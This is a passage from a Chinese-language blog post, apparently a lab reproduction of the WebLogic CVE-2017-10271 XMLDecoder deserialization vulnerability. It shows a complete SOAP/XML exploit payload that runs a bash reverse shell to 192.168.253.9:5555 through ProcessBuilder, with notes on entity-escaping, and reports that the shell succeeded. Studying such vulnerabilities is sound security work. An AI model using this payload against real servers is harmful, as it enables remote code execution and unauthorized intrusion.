class="string">&quot;start&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>尝试发包后报错如下，经过排查后发现可能是无法正常解析<code>&gt;</code>和<code>&amp;</code>这种特殊字符，我们可以选择使用xml实体来替换这两个字符，替换后如下所示</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.253.9/5555 0&gt;&amp;amp;1</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1695565458002.png" alt="1695565458002"></p>
<p>最终xml构造如下所示</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.6.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i <span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span> /dev/tcp/192.168.253.9/5555 0&gt;<span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>反弹Shell执行成功</p>
<p><img src="/2022/08/14/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2017-10271%EF%BC%88IDEA+Docker%EF%BC%89/1695565842875.png" alt="1695565842875"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10172">weblogic漏洞分析之CVE-2017-10271 - 先知社区 (aliyun.com)</a></p>
<p><a target="_blank" rel="noopener" href="http://www.wxylyw.com/2018/11/03/WebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">WebLogic XMLDecoder反序列化漏洞 | 像风 (wxylyw.com)</a></p>
<a href="/2022/08/13/%E7%90%86%E8%A7%A3Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/" title="理解Java反序列化漏洞原理">理解Java反序列化漏洞原理</a>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Yuband</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">11</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">10</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
  </nav>
</div>


<div class="cc-license animated" itemprop="sponsor">
  <a href="https://www.netlify.com" class="cc-opacity" title="Deploy with Netlify → https://www.netlify.com" target="_blank"><img width="80" src="https://www.netlify.com/img/global/badges/netlify-dark.svg" alt="Netlify"></a>
</div>
      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Yuband</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
